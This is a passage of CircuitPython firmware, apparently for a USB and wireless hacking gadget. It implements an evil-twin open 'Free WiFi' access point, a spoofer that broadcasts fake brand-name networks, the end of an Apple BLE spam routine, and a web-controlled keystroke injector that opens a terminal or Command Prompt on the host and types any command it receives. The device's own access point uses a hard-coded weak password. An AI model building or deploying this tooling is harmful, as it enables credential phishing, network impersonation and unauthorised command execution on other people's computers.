        info_label = label.Label(terminalio.FONT, text=info_text, color=NEON_WHITE, x=10, y=70, scale=1)
        display_group.append(info_label)
        
        # Reset counter
        apple_spam_count = 0
        
        print(f"Apple spam stopped successfully, sent {apple_spam_count} packets")
    else:
        not_running_text = "Apple Spam Not Running"
        not_running_label = label.Label(terminalio.FONT, text=not_running_text, color=NEON_ORANGE, x=10, y=50, scale=1)
        display_group.append(not_running_label)
        
        print("Apple spam was not running")
    
    # Show for 3 seconds then return
    time.sleep(3)
    ble_menu.draw(display_group)
    set_current_view(ble_menu)


# WiFi functions
def scan_wifi_networks(user_data=None):
    global wifi_menu
    """Scan for available WiFi networks with scrolling and back button"""
    print("=== WiFi Network Scan ===")
    print("Starting WiFi network scan...")
    clear_group()
    
    title_text = label.Label(terminalio.FONT, text="WiFi Network Scan", color=NEON_PURPLE, x=10, y=20, scale=2)
    display_group.append(title_text)
    
    try:
        status_text = "Scanning networks..."
        status_label = label.Label(terminalio.FONT, text=status_text, color=NEON_WHITE, x=10, y=50, scale=1)
        display_group.append(status_label)
        
        # Check if WiFi radio is available
        if not hasattr(wifi, 'radio'):
            print("ERROR: wifi.radio not available")
            error_text = "WiFi radio not available"
            error_label = label.Label(terminalio.FONT, text=error_text, color=NEON_PINK, x=10, y=70, scale=1)
            display_group.append(error_label)
            time.sleep(3)
            wifi_menu.draw(display_group)
            set_current_view(wifi_menu)
            return
        
        print("Starting network scan...")
        # Stop any existing scan first
        try:
            wifi.radio.stop_scanning_networks()
        except:
            pass
        
        # Start new scan
        networks = wifi.radio.start_scanning_networks()
        
        # Clear status and collect all networks
        display_group.remove(status_label)
        
        # Collect all networks first
        all_networks = []
        for network in networks:
            try:
                ssid = str(network.ssid)[:12] if hasattr(network, 'ssid') else str(network)[:12]
                rssi = network.rssi if hasattr(network, 'rssi') else "N/A"
                security = "Sec" if (hasattr(network, 'security') and network.security) else "Open"
                all_networks.append((ssid, rssi, security))
                print(f"Found: {ssid} ({rssi}dB) {security}")
            except Exception as e:
                print(f"Error processing network: {e}")
                continue
        
        if not all_networks:
            print("No networks found")
            no_networks = label.Label(terminalio.FONT, text="No networks found", color=NEON_PINK, x=10, y=50, scale=1)
            display_group.append(no_networks)
            back_text = label.Label(terminalio.FONT, text="Press ENTER to go back", color=NEON_BLUE, x=10, y=80, scale=1)
            display_group.append(back_text)
            
            # Wait for back button
            buttons = Buttons()
            while not buttons.pressed(Buttons.ENTER):
                time.sleep(0.1)
            
            wifi_menu.draw(display_group)
            set_current_view(wifi_menu)
            return
        
        print(f"Found {len(all_networks)} networks")
        
        # Display networks with pagination - show each page for 5 seconds
        current_page = 0
        networks_per_page = 5
        total_pages = (len(all_networks) + networks_per_page - 1) // networks_per_page
        
        while current_page < total_pages:
            clear_group()
            display_group.append(title_text)
            
            # Show page info
            page_text = f"Page {current_page + 1}/{total_pages} ({len(all_networks)} networks)"
            page_label = label.Label(terminalio.FONT, text=page_text, color=NEON_BLUE, x=10, y=40, scale=1)
            display_group.append(page_label)
            
            # Show networks for current page
            start_idx = current_page * networks_per_page
            end_idx = min(start_idx + networks_per_page, len(all_networks))
            y_pos = 60
            
            for i in range(start_idx, end_idx):
                ssid, rssi, security = all_networks[i]
                network_text = f"{ssid} ({rssi}dB) {security}"
                network_label = label.Label(terminalio.FONT, text=network_text, color=NEON_WHITE, x=10, y=y_pos, scale=1)
                display_group.append(network_label)
                y_pos += 18
            
            # Show instruction
            if total_pages > 1:
                nav_text = "Next page in 5s or ENTER to exit"
            else:
                nav_text = "Press ENTER to go back"
            nav_label = label.Label(terminalio.FONT, text=nav_text, color=NEON_GREEN, x=10, y=160, scale=1)
            display_group.append(nav_label)
            
            # Show page for 5 seconds
            time.sleep(5)
            current_page += 1
        
        # Return to menu
        wifi_menu.draw(display_group)
        set_current_view(wifi_menu)
        return
        
    except Exception as e:
        print(f"Scan error: {e}")
        import traceback
        traceback.print_exception(e)
        
        error_text = f"Scan error: {str(e)[:25]}"
        error_label = label.Label(terminalio.FONT, text=error_text, color=NEON_PINK, x=10, y=50, scale=1)
        display_group.append(error_label)
        
        back_text = label.Label(terminalio.FONT, text="Press ENTER to go back", color=NEON_BLUE, x=10, y=80, scale=1)
        display_group.append(back_text)
        
        # Wait for back button
        buttons = Buttons()
        while not buttons.pressed(Buttons.ENTER):
            time.sleep(0.1)
        
        wifi_menu.draw(display_group)
        set_current_view(wifi_menu)
    
    print("=== End WiFi Network Scan ===")


# Global state for WiFi operations
wifi_ap_active = False
wifi_scanning = False


def start_evil_twin_ap(user_data=None):
    """Start evil twin access point"""
    global wifi_ap_active, wifi_menu
    print("=== Starting Evil Twin AP ===")
    clear_group()
    
    title_text = label.Label(terminalio.FONT, text="Start Evil AP", color=NEON_PURPLE, x=10, y=20, scale=2)
    display_group.append(title_text)
    
    # Check if already running
    if wifi_ap_active:
        status_text = "AP Already Running!"
        status_label = label.Label(terminalio.FONT, text=status_text, color=NEON_ORANGE, x=10, y=50, scale=1)
        display_group.append(status_label)
        
        ssid_text = "SSID: Free WiFi"
        ssid_label = label.Label(terminalio.FONT, text=ssid_text, color=NEON_WHITE, x=10, y=70, scale=1)
        display_group.append(ssid_label)
        
        info_text = "Use 'Stop Evil AP' to stop"
        info_label = label.Label(terminalio.FONT, text=info_text, color=NEON_BLUE, x=10, y=90, scale=1)
        display_group.append(info_label)
        
    else:
        # Start the AP
        status_text = "Starting AP..."
        status_label = label.Label(terminalio.FONT, text=status_text, color=NEON_BLUE, x=10, y=50, scale=1)
        display_group.append(status_label)
        
        try:
            print("Starting Evil Twin AP...")
            # Start AP without password (open network)
            wifi.radio.start_ap("Free WiFi", "")  # Empty string = open network
            wifi_ap_active = True
            
            # Start DHCP server
            if hasattr(wifi.radio, 'start_dhcp'):
                wifi.radio.start_dhcp()
                print("DHCP server started")
            
            # Show success
            clear_group()
            display_group.append(title_text)
            
            success_text = "AP Started Successfully!"
            success_label = label.Label(terminalio.FONT, text=success_text, color=NEON_GREEN, x=10, y=50, scale=1)
            display_group.append(success_label)
            
            ssid_text = "SSID: Free WiFi"
            ssid_label = label.Label(terminalio.FONT, text=ssid_text, color=NEON_WHITE, x=10, y=70, scale=1)
            display_group.append(ssid_label)
            
            security_text = "Security: Open (No Password)"
            security_label = label.Label(terminalio.FONT, text=security_text, color=NEON_ORANGE, x=10, y=90, scale=1)
            display_group.append(security_label)
            
            if hasattr(wifi.radio, 'ipv4_address_ap'):
                ip_text = f"Gateway: {wifi.radio.ipv4_address_ap}"
                ip_label = label.Label(terminalio.FONT, text=ip_text, color=NEON_WHITE, x=10, y=110, scale=1)
                display_group.append(ip_label)
            
            info_text = "Devices can connect freely"
            info_label = label.Label(terminalio.FONT, text=info_text, color=NEON_BLUE, x=10, y=130, scale=1)
            display_group.append(info_label)
            
            print("Evil Twin AP started successfully")
            
        except Exception as e:
            print(f"AP error: {e}")
            error_text = f"AP error: {str(e)[:25]}"
            error_label = label.Label(terminalio.FONT, text=error_text, color=NEON_PINK, x=10, y=50, scale=1)
            display_group.append(error_label)
    
    # Show for 3 seconds then return
    time.sleep(3)
    wifi_menu.draw(display_group)
    set_current_view(wifi_menu)


def stop_evil_twin_ap(user_data=None):
    """Stop evil twin access point"""
    global wifi_ap_active
    print("=== Stopping Evil Twin AP ===")
    clear_group()
    
    title_text = label.Label(terminalio.FONT, text="Stop Evil AP", color=NEON_PURPLE, x=10, y=20, scale=2)
    display_group.append(title_text)
    
    if wifi_ap_active:
        status_text = "Stopping AP..."
        status_label = label.Label(terminalio.FONT, text=status_text, color=NEON_BLUE, x=10, y=50, scale=1)
        display_group.append(status_label)
        
        try:
            print("Stopping AP...")
            if hasattr(wifi.radio, 'stop_ap'):
                wifi.radio.stop_ap()
            wifi_ap_active = False
            print("AP stopped")
            
            # Show success
            clear_group()
            display_group.append(title_text)
            
            success_text = "AP Stopped Successfully"
            success_label = label.Label(terminalio.FONT, text=success_text, color=NEON_GREEN, x=10, y=50, scale=1)
            display_group.append(success_label)
            
            info_text = "Free WiFi network disabled"
            info_label = label.Label(terminalio.FONT, text=info_text, color=NEON_WHITE, x=10, y=70, scale=1)
            display_group.append(info_label)
            
        except Exception as e:
            print(f"Error stopping AP: {e}")
            error_text = f"Stop error: {str(e)[:25]}"
            error_label = label.Label(terminalio.FONT, text=error_text, color=NEON_PINK, x=10, y=50, scale=1)
            display_group.append(error_label)
    
    else:
        status_text = "AP Not Running"
        status_label = label.Label(terminalio.FONT, text=status_text, color=NEON_PINK, x=10, y=50, scale=1)
        display_group.append(status_label)
        
        info_text = "Use 'Start Evil AP' to start"
        info_label = label.Label(terminalio.FONT, text=info_text, color=NEON_BLUE, x=10, y=70, scale=1)
        display_group.append(info_label)
    
    # Show for 3 seconds then return
    time.sleep(3)
    wifi_menu.draw(display_group)
    set_current_view(wifi_menu)


def start_ssid_spam(user_data=None):
    """Start SSID spoofer - cycles through fake network names"""
    global wifi_ap_active
    print("=== SSID Spoofer ===")
    clear_group()
    
    title_text = label.Label(terminalio.FONT, text="SSID Spoofer", color=NEON_PURPLE, x=10, y=20, scale=2)
    display_group.append(title_text)
    
    # List of fake SSIDs to cycle through
    fake_ssids = [
        "Starbucks Free WiFi",
        "McDonalds WiFi",
        "Xfinity WiFi",
        "AT&T WiFi",
        "Verizon WiFi",
        "T-Mobile Hotspot",
        "Southwest WiFi",
        "Secure WiFi",
        "Cats Rule WiFi",
        "Airport Free WiFi",
        "Hotel Guest WiFi",
        "Coffee Shop WiFi",
        "Library WiFi",
        "Mall WiFi",
        "Restaurant WiFi",
        "Free Public WiFi"
    ]
    
    if wifi_ap_active:
        # Stop current AP first
        try:
            wifi.radio.stop_ap()
            wifi_ap_active = False
            print("Stopped current AP")
        except Exception as e:
            print(f"Error stopping AP: {e}")
    
    # Start SSID spoofer
    status_text = "Starting SSID Spoofer..."
    status_label = label.Label(terminalio.FONT, text=status_text, color=NEON_BLUE, x=10, y=50, scale=1)
    display_group.append(status_label)
    
    info_text = "Cycling through fake SSIDs"
    info_label = label.Label(terminalio.FONT, text=info_text, color=NEON_WHITE, x=10, y=70, scale=1)
    display_group.append(info_label)
    
    # Show first few SSIDs
    y_pos = 90
    for i, ssid in enumerate(fake_ssids[:5]):
        ssid_text = f"{i+1}. {ssid}"
        ssid_label = label.Label(terminalio.FONT, text=ssid_text, color=NEON_WHITE, x=10, y=y_pos, scale=1)
        display_group.append(ssid_label)
        y_pos += 15
    
    more_text = "... and more"
    more_label = label.Label(terminalio.FONT, text=more_text, color=NEON_ORANGE, x=10, y=y_pos, scale=1)
    display_group.append(more_label)
    
    # Start cycling through SSIDs
    try:
        for i, ssid in enumerate(fake_ssids):
            print(f"Broadcasting: {ssid}")
            
            # Start AP with current SSID
            wifi.radio.start_ap(ssid, "")
            wifi_ap_active = True
            
            # Show current SSID on screen
            clear_group()
            display_group.append(title_text)
            
            current_text = f"Broadcasting: {ssid}"
            current_label = label.Label(terminalio.FONT, text=current_text, color=NEON_GREEN, x=10, y=50, scale=1)
            display_group.append(current_label)
            
            progress_text = f"SSID {i+1}/{len(fake_ssids)}"
            progress_label = label.Label(terminalio.FONT, text=progress_text, color=NEON_WHITE, x=10, y=70, scale=1)
            display_group.append(progress_label)
            
            time_text = "Each SSID for 3 seconds"
            time_label = label.Label(terminalio.FONT, text=time_text, color=NEON_BLUE, x=10, y=90, scale=1)
            display_group.append(time_label)
            
            # Show for 3 seconds
            time.sleep(3)
            
            # Stop AP
            wifi.radio.stop_ap()
            wifi_ap_active = False
            
            # Small delay between SSIDs
            time.sleep(0.5)
        
        # Show completion
        clear_group()
        display_group.append(title_text)
        
        complete_text = "SSID Spoofer Complete!"
        complete_label = label.Label(terminalio.FONT, text=complete_text, color=NEON_GREEN, x=10, y=50, scale=1)
        display_group.append(complete_label)
        
        broadcasted_text = f"Broadcasted {len(fake_ssids)} fake SSIDs"
        broadcasted_label = label.Label(terminalio.FONT, text=broadcasted_text, color=NEON_WHITE, x=10, y=70, scale=1)
        display_group.append(broadcasted_label)
        
        print("SSID spoofer completed")
        
    except Exception as e:
        print(f"SSID spoofer error: {e}")
        error_text = f"Error: {str(e)[:25]}"
        error_label = label.Label(terminalio.FONT, text=error_text, color=NEON_PINK, x=10, y=50, scale=1)
        display_group.append(error_label)
    
    # Show for 3 seconds then return
    time.sleep(3)
    wifi_menu.draw(display_group)
    set_current_view(wifi_menu)


def show_wifi_status(user_data=None):
    """Show basic WiFi status information"""
    print("Showing WiFi status...")
    clear_group()
    
    title_text = label.Label(terminalio.FONT, text="WiFi Status", color=NEON_PURPLE, x=10, y=20, scale=2)
    display_group.append(title_text)
    
    y_pos = 50
    
    # Check if WiFi is enabled
    try:
        if wifi.radio.enabled:
            status_text = "WiFi: Enabled"
            status_label = label.Label(terminalio.FONT, text=status_text, color=NEON_GREEN, x=10, y=y_pos, scale=1)
            display_group.append(status_label)
            y_pos += 20
            
            # Show MAC address
            if hasattr(wifi.radio, 'mac_address'):
                mac_text = f"MAC: {wifi.radio.mac_address}"
                mac_label = label.Label(terminalio.FONT, text=mac_text, color=NEON_WHITE, x=10, y=y_pos, scale=1)
                display_group.append(mac_label)
                y_pos += 20
            
            # Check if connected to a network as client
            if wifi.radio.connected:
                connected_text = "Client: Connected"
                connected_label = label.Label(terminalio.FONT, text=connected_text, color=NEON_GREEN, x=10, y=y_pos, scale=1)
                display_group.append(connected_label)
                y_pos += 20
                
                ip_text = f"Client IP: {wifi.radio.ipv4_address}"
                ip_label = label.Label(terminalio.FONT, text=ip_text, color=NEON_WHITE, x=10, y=y_pos, scale=1)
                display_group.append(ip_label)
                y_pos += 20
            else:
                not_connected_text = "Client: Not connected"
                not_connected_label = label.Label(terminalio.FONT, text=not_connected_text, color=NEON_PINK, x=10, y=y_pos, scale=1)
                display_group.append(not_connected_label)
                y_pos += 20
            
            # Show AP status if running
            if wifi_ap_active:
                ap_text = "AP Mode: Active"
                ap_label = label.Label(terminalio.FONT, text=ap_text, color=NEON_ORANGE, x=10, y=y_pos, scale=1)
                display_group.append(ap_label)
                y_pos += 20
                
                if hasattr(wifi.radio, 'ipv4_address_ap'):
                    ap_ip_text = f"AP Gateway: {wifi.radio.ipv4_address_ap}"
                    ap_ip_label = label.Label(terminalio.FONT, text=ap_ip_text, color=NEON_WHITE, x=10, y=y_pos, scale=1)
                    display_group.append(ap_ip_label)
                    y_pos += 20
                
                # Try to show connected devices
                try:
                    if hasattr(wifi.radio, 'stations_ap'):
                        stations = wifi.radio.stations_ap
                        if stations:
                            devices_text = f"AP Clients: {len(stations)} connected"
                            devices_label = label.Label(terminalio.FONT, text=devices_text, color=NEON_GREEN, x=10, y=y_pos, scale=1)
                            display_group.append(devices_label)
                        else:
                            devices_text = "AP Clients: 0 connected"
                            devices_label = label.Label(terminalio.FONT, text=devices_text, color=NEON_PINK, x=10, y=y_pos, scale=1)
                            display_group.append(devices_label)
                except Exception as e:
                    devices_text = "AP Clients: Unknown"
                    devices_label = label.Label(terminalio.FONT, text=devices_text, color=NEON_WHITE, x=10, y=y_pos, scale=1)
                    display_group.append(devices_label)
        else:
            disabled_text = "WiFi: Disabled"
            disabled_label = label.Label(terminalio.FONT, text=disabled_text, color=NEON_PINK, x=10, y=y_pos, scale=1)
            display_group.append(disabled_label)
            
    except Exception as e:
        error_text = f"Status error: {str(e)[:20]}"
        error_label = label.Label(terminalio.FONT, text=error_text, color=NEON_PINK, x=10, y=50, scale=1)
        display_group.append(error_label)
    
    # Show for 5 seconds then return
    time.sleep(5)
    wifi_menu.draw(display_group)
    set_current_view(wifi_menu)


# Web control functions
def start_web_server(user_data=None):
    global web_menu, web_server_running
    """Start web control server"""
    print("Starting web server...")
    clear_group()
    text_area = label.Label(terminalio.FONT, text="Starting Web Server", color=NEON_GREEN, x=10, y=20, scale=2)
    display_group.append(text_area)
    
    status_text = label.Label(terminalio.FONT, text="Creating WiFi AP...", color=NEON_WHITE, x=10, y=50, scale=1)
    display_group.append(status_text)
    
    try:
        # Start WiFi access point
        print("Creating WiFi AP: dn_key_pro (12345678)")
        wifi.radio.start_ap(ssid="dn_key_pro", password="12345678", channel=6)
        web_server_running = True
        
        print("WiFi AP created successfully!")
        print("Connect to: dn_key_pro")
        print("Password: 12345678")
        print("Web interface: http://192.168.4.1")
        
        status_text.text = "WiFi AP: dn_key_pro (12345678)"
        time.sleep(2)
        
        # Start web server
        status_text.text = "Web server running at 192.168.4.1"
        time.sleep(2)
        
        # Show instructions
        status_text.text = "Connect to WiFi and visit 192.168.4.1"
        time.sleep(3)
        
    except Exception as e:
        print(f"Error starting web server: {e}")
        status_text.text = f"Error: {e}"
        time.sleep(3)
    
    web_menu.draw(display_group)
    set_current_view(web_menu)


def stop_web_server(user_data=None):
    global web_menu, web_server_running
    """Stop web control server"""
    print("Stopping web server...")
    clear_group()
    text_area = label.Label(terminalio.FONT, text="Stopping Web Server", color=NEON_GREEN, x=10, y=20, scale=2)
    display_group.append(text_area)
    
    status_text = label.Label(terminalio.FONT, text="Shutting down...", color=NEON_WHITE, x=10, y=50, scale=1)
    display_group.append(status_text)
    
    try:
        # Close server socket if it exists
        global web_server_socket
        if web_server_socket is not None:
            try:
                web_server_socket.close()
            except:
                pass
            web_server_socket = None
        
        # Stop WiFi access point
        wifi.radio.stop_ap()
        web_server_running = False
        
        status_text.text = "Web server stopped"
        time.sleep(2)
        
    except Exception as e:
        print(f"Error stopping web server: {e}")
        status_text.text = f"Error: {e}"
        time.sleep(2)
    
    web_menu.draw(display_group)
    set_current_view(web_menu)





# Status functions
def refresh_status(user_data=None):
    """Refresh system status"""
    print("Refreshing status...")
    load_status_screen()


def test_display(user_data=None):
    global status_menu
    """Test display functionality"""
    print("Testing display...")
    clear_group()
    text_area = label.Label(terminalio.FONT, text="Display Test", color=NEON_WHITE, x=10, y=30, scale=2)
    display_group.append(text_area)
    text_area2 = label.Label(terminalio.FONT, text="Display working!", color=NEON_GREEN, x=10, y=60, scale=1)
    display_group.append(text_area2)
    time.sleep(3)
    status_menu.draw(display_group)
    set_current_view(status_menu)


def test_leds(user_data=None):
    global status_menu
    """Test LED functionality"""
    print("Testing LEDs...")
    clear_group()
    text_area = label.Label(terminalio.FONT, text="LED Test", color=NEON_WHITE, x=10, y=30, scale=2)
    display_group.append(text_area)
    
    # Flash LEDs
    for i in range(3):
        pixels.fill(NEON_GREEN)
        time.sleep(0.5)
        pixels.fill((0, 0, 0))
        time.sleep(0.5)
    
    text_area2 = label.Label(terminalio.FONT, text="LEDs working!", color=NEON_GREEN, x=10, y=60, scale=1)
    display_group.append(text_area2)
    time.sleep(2)
    status_menu.draw(display_group)
    set_current_view(status_menu)


jrainbow = 0
rainbow_running = True
def rainbow_cycle(wait, num_pixels=4):
    global jrainbow, rainbow_running
    if not rainbow_running:
        return
    r = 255
    for i in range(num_pixels):
        rc_index = (i * r+1 // num_pixels) + jrainbow
        pixels[i] = colorwheel(rc_index & r)
    pixels.show()
    jrainbow = 0 if jrainbow > r else (jrainbow + 1)


# ============================================================================
# WEB CONTROLS OS CONSTANTS AND FUNCTIONS
# ============================================================================

# OS-specific command mappings - centralized for easy maintenance
OS_COMMAND_MAP = {
    'macos': {
        'terminal': {'keys': [Keycode.COMMAND, Keycode.SPACE], 'type': "terminal\n", 'wait': 0.4, 'enter': True, 'result': "Terminal opened"},
        'screenshot': {'keys': [Keycode.COMMAND, Keycode.SHIFT, Keycode.THREE], 'result': "Screenshot taken"},
        'lock_screen': {'keys': [Keycode.COMMAND, Keycode.CONTROL, Keycode.Q], 'result': "Screen locked"},
        'finder': {'keys': [Keycode.COMMAND, Keycode.SPACE], 'type': "finder\n", 'wait': 0.4, 'enter': True, 'result': "Finder opened"}
    },
    'windows': {
        'cmd': {'keys': [Keycode.WINDOWS, Keycode.R], 'type': "cmd\n", 'wait': 0.4, 'enter': True, 'result': "Command Prompt opened"},
        'screenshot': {'keys': [Keycode.PRINT_SCREEN], 'result': "Screenshot taken"},
        'lock_screen': {'keys': [Keycode.WINDOWS, Keycode.L], 'result': "Screen locked"},
        'explorer': {'keys': [Keycode.WINDOWS, Keycode.E], 'result': "File Explorer opened"},
        'run': {'keys': [Keycode.WINDOWS, Keycode.R], 'result': "Run Dialog opened"}
    },
    'linux': {
        'terminal': {'keys': [Keycode.CONTROL, Keycode.ALT, Keycode.T], 'result': "Terminal opened (Ctrl+Alt+T)"},
        'run_command': {'keys': [Keycode.ALT, Keycode.F2], 'result': "Run Command opened (Alt+F2)"},
        'screenshot': {'keys': [Keycode.PRINT_SCREEN], 'result': "Screenshot taken (PrtSc)"},
        'lock_screen': {'keys': [Keycode.WINDOWS, Keycode.L], 'result': "Screen locked (Super+L)"}
    }
}

# Universal commands (work across all OS)
UNIVERSAL_COMMANDS = {
    'volume_up': {'type': 'consumer', 'code': ConsumerControlCode.VOLUME_INCREMENT, 'result': "Volume increased"},
    'volume_down': {'type': 'consumer', 'code': ConsumerControlCode.VOLUME_DECREMENT, 'result': "Volume decreased"},
    'volume_mute': {'type': 'consumer', 'code': ConsumerControlCode.MUTE, 'result': "Volume muted/unmuted"},
    'media_play': {'type': 'consumer', 'code': ConsumerControlCode.PLAY_PAUSE, 'result': "Media play/pause toggled"}
}

# macOS-specific special commands
MACOS_SPECIAL = {
    'cmatrix': {'keys': [Keycode.COMMAND, Keycode.SPACE], 'type': "terminal\n", 'wait': 0.8, 'type2': "cmatrix\n", 'enter': True, 'result': "Cmatrix started"},
    'open_safari': {'keys': [Keycode.COMMAND, Keycode.SPACE], 'type': "safari\n", 'wait': 0.8, 'keys2': [Keycode.COMMAND, Keycode.L], 'wait2': 0.4, 'type2': "https://deepnet.store/pages/dn_key_s3", 'enter': True, 'result': "Safari opened"}
}

# Universal commands
UNIVERSAL_COMMANDS = {
    'volume_up': {'type': 'consumer', 'code': ConsumerControlCode.VOLUME_INCREMENT, 'result': "Volume increased"},
    'volume_down': {'type': 'consumer', 'code': ConsumerControlCode.VOLUME_DECREMENT, 'result': "Volume decreased"},
    'volume_mute': {'type': 'consumer', 'code': ConsumerControlCode.MUTE, 'result': "Volume muted/unmuted"},
    'media_play': {'type': 'consumer', 'code': ConsumerControlCode.PLAY_PAUSE, 'result': "Media play/pause toggled"}
}

# OS data for web interface
OS_DATA = {
    'macos': {'icon': '[MAC]', 'placeholder': 'Enter macOS command...'},
    'windows': {'icon': '[WIN]', 'placeholder': 'Enter Windows command...'},
    'linux': {'icon': '[LIN]', 'placeholder': 'Enter Linux command...'}
}

# OS commands for web interface
OS_COMMANDS = {
    'macos': {
        'terminal': 'Terminal',
        'finder': 'Finder',
        'screenshot': 'Screenshot',
        'lock_screen': 'Lock Screen'
    },
    'windows': {
        'cmd': 'Command Prompt',
        'explorer': 'File Explorer',
        'run': 'Run Dialog',
        'screenshot': 'Screenshot',
        'lock_screen': 'Lock Screen'
    },
    'linux': {
        'terminal': 'Terminal',
        'run_command': 'Run Command',
        'screenshot': 'Screenshot',
        'lock_screen': 'Lock Screen'
    }
}



def create_error_response(message, redirect_time=2):
    """Create an error HTML response."""
    return f"""HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html>
<head>
<meta http-equiv="refresh" content="{redirect_time}; url=/" />
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DN-KEY OS Controls - Error</title>
<style>{CSS}</style>
</head>
<body>
<div class="container">
<h1 style="color:#ff0000">❌ {message}</h1>
<div class="status" style="color:#aa0000">Redirecting to the main page in {redirect_time} seconds...</div>
</div>
</body>
</html>"""

# CSS for web interface
CSS = """
body { font-family: 'Courier New', monospace; background: #000; color: #00ff00; margin: 20px; }
h1 { color: #00ff00; text-align: center; }
.card { background: #111; border: 1px solid #00ff00; border-radius: 10px; padding: 20px; margin: 20px 0; }
.btn { background: #222; color: #00ff00; border: 1px solid #00ff00; padding: 15px 25px; margin: 5px; border-radius: 5px; cursor: pointer; font-size: 16px; }
.btn:hover { background: #00ff00; color: #000; }
.btn-macos { border-color: #ff6b6b; color: #ff6b6b; }
.btn-windows { border-color: #4ecdc4; color: #4ecdc4; }
.btn-linux { border-color: #45b7d1; color: #45b7d1; }
.os-icon { font-size: 24px; margin-right: 10px; }
.back-btn { background: #333; border-color: #666; color: #ccc; }
"""

def execute_os_command(command_config):
    """Execute a command based on its configuration."""
    keyboard = Keyboard(usb_hid.devices)
    keyboard_layout = KeyboardLayoutUS(keyboard)
    
    if 'keys' in command_config:
        keyboard.press(*command_config['keys'])
        keyboard.release_all()
    
    if 'type' in command_config:
        time.sleep(command_config.get('wait', 0.1))
        keyboard_layout.write(command_config['type'])
    
    if 'keys2' in command_config:
        keyboard.press(*command_config['keys2'])
        keyboard.release_all()
    
    if 'type2' in command_config:
        time.sleep(command_config.get('wait2', 0.1))
        keyboard_layout.write(command_config['type2'])
    
    if command_config.get('enter', False):
        keyboard.press(Keycode.ENTER)
        keyboard.release_all()

def execute_command(command, os_type="macos", keyboard_mode=False):
    try:
        # Initialize HID devices on-demand if not available
        global keyboard, keyboard_layout, consumer_control
        if keyboard is None:
            try:
                keyboard = Keyboard(usb_hid.devices)
                keyboard_layout = KeyboardLayoutUS(keyboard)
                print("Keyboard created on-demand for command execution")
            except Exception as e:
                return f"Keyboard initialization failed: {str(e)}"
        
        if consumer_control is None:
            try:
                consumer_control = ConsumerControl(usb_hid.devices)
                print("Consumer control created on-demand for media commands")
            except Exception as e:
                return f"Consumer control initialization failed: {str(e)}"
        
        # Handle keyboard mode (special keys and text input)
        if keyboard_mode:
            if command == 'enter':
                keyboard.press(Keycode.ENTER)
                keyboard.release_all()
                result = "Enter key sent"
            elif command == 'tab':
                keyboard.press(Keycode.TAB)
                keyboard.release_all()
                result = "Tab key sent"
            elif command == 'escape':
                keyboard.press(Keycode.ESCAPE)
                keyboard.release_all()
                result = "Escape key sent"
            else:
                keyboard_layout.write(command)
                result = f"Text '{command}' typed"
            return result
        
        # Handle universal commands (volume/media controls)
        if command in UNIVERSAL_COMMANDS:
            cmd_config = UNIVERSAL_COMMANDS[command]
            consumer_control.press(cmd_config['code'])
            consumer_control.release()
            result = cmd_config['result']
            return result
        
        # Handle macOS-specific special commands
        if os_type == "macos" and command in MACOS_SPECIAL:
            cmd_config = MACOS_SPECIAL[command]
            execute_os_command(cmd_config)
            result = cmd_config['result']
            return result
        
        # Handle OS-specific commands
        if os_type in OS_COMMAND_MAP and command in OS_COMMAND_MAP[os_type]:
            cmd_config = OS_COMMAND_MAP[os_type][command]
            execute_os_command(cmd_config)
            result = cmd_config['result']
            return result
        
        # Handle custom commands (open terminal/command prompt and run command)
        if os_type == "macos":
            keyboard.press(Keycode.COMMAND, Keycode.SPACE)
            keyboard.release_all()
            time.sleep(0.4)
            keyboard_layout.write("terminal\n")
            time.sleep(0.8)
            keyboard_layout.write(f"{command}\n")
            keyboard.press(Keycode.RETURN)
            keyboard.release_all()
            result = f"Command '{command}' executed in Terminal"
        elif os_type == "windows":
            keyboard.press(Keycode.WINDOWS, Keycode.R)
            keyboard.release_all()
            time.sleep(0.4)
            keyboard_layout.write("cmd\n")
            keyboard.press(Keycode.ENTER)
            keyboard.release_all()
            time.sleep(0.8)
            keyboard_layout.write(f"{command}\n")
            keyboard.press(Keycode.ENTER)
            keyboard.release_all()
            result = f"Command '{command}' executed in Command Prompt"
        elif os_type == "linux":
            keyboard.press(Keycode.CONTROL, Keycode.ALT, Keycode.T)
            keyboard.release_all()
            time.sleep(0.8)
            keyboard_layout.write(f"{command}\n")
            keyboard.press(Keycode.ENTER)
            keyboard.release_all()
            result = f"Command '{command}' executed in Terminal"
        else:
            keyboard.press(Keycode.COMMAND, Keycode.SPACE)
            keyboard.release_all()
            time.sleep(0.4)
            keyboard_layout.write("terminal\n")
            time.sleep(0.8)
            keyboard_layout.write(f"{command}\n")
            keyboard.press(Keycode.RETURN)
            keyboard.release_all()
            result = f"Command '{command}' executed in terminal"
        
        return result
        
    except Exception as e:
        return f"Command execution failed: {str(e)}"

def toggle_mouse_jiggler():
    """Toggle mouse jiggler on/off."""
    global do_mouse_jiggle
    do_mouse_jiggle = not do_mouse_jiggle
    if do_mouse_jiggle:
        pixels.fill(NEON_ORANGE)
        pixels.show()
    else:
        pixels.fill(NEON_GREEN)
        pixels.show()
    return "Mouse jiggler " + ("started" if do_mouse_jiggle else "stopped")

def toggle_mouse_jiggler_menu(user_data=None):
    """Menu function to toggle mouse jiggler with display feedback."""
    global do_mouse_jiggle
    do_mouse_jiggle = not do_mouse_jiggle
    
    # Update LED status
    if do_mouse_jiggle:
        pixels.fill(NEON_ORANGE)
        pixels.show()
    else:
        pixels.fill(NEON_GREEN)
        pixels.show()
    
    # Show status on screen
    clear_group()
    
    title_text = label.Label(terminalio.FONT, text="Mouse Jiggler", color=NEON_PURPLE, x=10, y=20, scale=2)
    display_group.append(title_text)
    
    status_text = "ACTIVE" if do_mouse_jiggle else "STOPPED"
    status_color = NEON_ORANGE if do_mouse_jiggle else NEON_GREEN
    status_label = label.Label(terminalio.FONT, text=status_text, color=status_color, x=10, y=40, scale=2)
    display_group.append(status_label)
    
    info_text = "Moving mouse randomly"
    info_label = label.Label(terminalio.FONT, text=info_text, color=NEON_WHITE, x=10, y=60, scale=1)
    display_group.append(info_label)
    
    # Return to main menu after 2 seconds
    time.sleep(2)
    main_menu.draw(display_group)



def decode_url(text):
    """Decode URL-encoded text."""
    # Simple URL decoding without urllib
